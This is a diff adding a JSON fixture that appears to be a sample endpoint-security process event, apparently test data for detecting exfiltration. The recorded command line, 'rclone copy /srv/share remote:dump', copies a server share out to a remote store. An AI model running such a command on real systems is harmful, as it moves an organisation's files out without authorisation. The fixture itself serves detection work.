@@ -1,0 +1,31 @@
+[
+  {
+    "_source": "sentinelone_cloudfunnel",
+    "event": {
+      "category": "process",
+      "type": "Process Creation"
+    },
+    "agent": {
+      "uuid": "5e4482b45d134ae8bf4901cb52b65e88"
+    },
+    "endpoint": {
+      "name": "host05.example.com",
+      "os": "linux"
+    },
+    "tgt": {
+      "process": {
+        "name": "rclone",
+        "cmdline": "rclone copy /srv/share remote:dump",
+        "image": {
+          "path": "/usr/local/bin/rclone"
+        },
+        "user": "jdoe"
+      }
+    },
+    "src": {
+      "process": {
+        "name": "bash"
+      }
+    }
+  }
+]
